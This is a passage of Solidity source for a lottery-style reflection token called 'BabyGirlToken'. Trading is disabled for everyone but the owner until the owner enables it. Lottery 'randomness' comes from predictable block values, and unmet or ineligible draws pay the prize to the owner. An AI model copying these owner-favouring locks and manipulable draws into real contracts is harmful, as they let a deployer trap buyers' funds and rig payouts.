contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}



contract BabyGirlToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    address[] public players;
    address public winner;
    address private _owner;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private lotterys;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
   
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**6 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    
    string private _name = 'Baby Girl Token';
    string private _symbol = 'BabyGirlToken';
    uint8 private _decimals = 9;

    uint256 public _maxTxAmount = 1000000 * 10**6 * 10**9; //1/1000
	
	uint256 public _minAddPoolAmount = 1000000000 * 10**9;
	
	//modify
	bool public _transferEnalbe = false; //enable _taxFee = 10
	
	uint256 private _taxFee = 0;
	
	uint8 private _maxWinWeight = 100;
	
    mapping (address => bool) private _isLastTradeSelled;
	
	uint256 public	_tradeLimitTimes = 2;
		
	mapping (address => uint256) public _lastTradeTimes;
	
    constructor () public {
        _rOwned[_msgSender()] = _rTotal;
         _owner = _msgSender();
		players.push(_owner);
		lotterys[_owner] = lotterys[_owner]+1;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function getPlayers() public view  returns (uint256) {
        return players.length;
    }
	
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }
	
	function isLastTradeSelled(address account) public view returns (bool) {
		return _isLastTradeSelled[account];
	}
	
	function getMinAddPoolAmount(address account) public view  returns (uint256) {
        return _minAddPoolAmount*(lotterys[account]/10+1);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }
	     
    function setMaxTxThousand(uint256 maxTxThousand) external onlyOwner() {
        _maxTxAmount = _tTotal.mul(maxTxThousand).div(
            10**3
        );
    }
	
	function setMinAddPoolAmount(uint256 amount) external onlyOwner() {
        _minAddPoolAmount = amount;
    } 
	
	function setTradeLimitTimes(uint256 tradeLimitTimes) external onlyOwner() {
		_tradeLimitTimes = tradeLimitTimes;
    }
	
	function setTransferEnable(bool transferEnalbe) external onlyOwner() {
		_transferEnalbe = transferEnalbe;
		
		if(_transferEnalbe)
			_taxFee = 10;
		else
			_taxFee = 0;
    }
		
    function reflect(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,) = _getValues(tAmount,_taxFee);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount,_taxFee);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,) = _getValues(tAmount,_taxFee);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function excludeAccount(address account) external onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeAccount(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
     receive() external payable {}
     
    function isContractaddr(address addr) public view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
      }
      	    
     function winningProbability(address addr) public view returns(bool enable, uint256 myLottery,uint256 poolSize) {
        require(addr != address(0), "Please buy token first");
        return (!_isLastTradeSelled[addr],lotterys[addr],players.length);
     }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(sender != owner() && recipient != owner()){
			require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");	
			require(_transferEnalbe, "Transfer invalid");	
		}
          		
        //modify
        if(sender != recipient){
			if(isContractaddr(sender) && !isContractaddr(recipient)){	
				uint256  tempTime = block.timestamp;
				require(tempTime > _lastTradeTimes[recipient]+_tradeLimitTimes, "transfer time limit");
				_lastTradeTimes[recipient] = tempTime;
				
				if(amount >= (_minAddPoolAmount*(lotterys[recipient]/10+1))){
					_isLastTradeSelled[recipient] = false;
					if(lotterys[recipient] < _maxWinWeight){
						players.push(recipient);
						lotterys[recipient] = lotterys[recipient]+1;
					}			
				}              
			} else if(!isContractaddr(sender)){		
				uint256  tempTime = block.timestamp;
				require(tempTime > _lastTradeTimes[sender]+_tradeLimitTimes, "transfer time limit");
				_lastTradeTimes[sender] = tempTime;		
                if(sender != owner())		
				    _isLastTradeSelled[sender] = true;	

				if(sender == owner() && !isContractaddr(recipient))		
				    _isLastTradeSelled[recipient] = true;	
			}
        }
								
		if (_isExcluded[sender] && !_isExcluded[recipient]) {
			_transferFromExcluded(sender, recipient, amount);
		} else if (!_isExcluded[sender] && _isExcluded[recipient]) {
			_transferToExcluded(sender, recipient, amount);
		} else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
			_transferStandard(sender, recipient, amount);
		} else if (_isExcluded[sender] && _isExcluded[recipient]) {
			_transferBothExcluded(sender, recipient, amount);
		} else {
			_transferStandard(sender, recipient, amount);
		}   					
    }
    
    function _winnerDraw(uint256 bfee) private{
		if(bfee > 0){
			bytes memory info = abi.encodePacked(block.difficulty,block.timestamp,players.length);
			bytes32 hash = keccak256(info);
			uint index = uint(hash)%players.length;
			winner = players[index];
			
			//modify
			if(_isLastTradeSelled[winner] || balanceOf(winner) < (_minAddPoolAmount*(lotterys[winner]/10+1))){
				winner = _owner;
			}
				
			uint256 currentRate =  _getRate();
			uint256 bonusFee = bfee.mul(currentRate);
			_rOwned[winner] = _rOwned[winner].add(bonusFee); 
			 if(_isExcluded[winner])
				_tOwned[winner] = _tOwned[winner].add(bfee);
			
			emit Transfer(address(this),winner,bfee);		
		}       
    }
    
    
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 bonusFee) = _getValues(tAmount,_taxFee);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);  
        _reflectFee(rFee, tFee);
       _winnerDraw(bonusFee);
        emit Transfer(sender, recipient, tTransferAmount);
      
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 bonusFee) = _getValues(tAmount,_taxFee);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _reflectFee(rFee, tFee);
        _winnerDraw(bonusFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 bonusFee) = _getValues(tAmount,_taxFee);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _reflectFee(rFee, tFee);
        _winnerDraw(bonusFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 bonusFee) = _getValues(tAmount,_taxFee);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _reflectFee(rFee, tFee);
        _winnerDraw(bonusFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
   
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _tFeeTotal = _tFeeTotal.add(tFee).add(rFee).sub(tFee);
    }

    function _getValues(uint256 tAmount,uint256 taxFee) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee,uint256 bonusFee) = _getTValues(tAmount,taxFee);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee,bonusFee, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee,bonusFee);
    }

    function _getTValues(uint256 tAmount,uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = 0;//tAmount.div(100).mul(2);
        uint256 bonusFee = tAmount.div(100).mul(taxFee);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(bonusFee);
        return (tTransferAmount, tFee,bonusFee);
    }
     
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 bonusFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 bFee = bonusFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(bFee);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
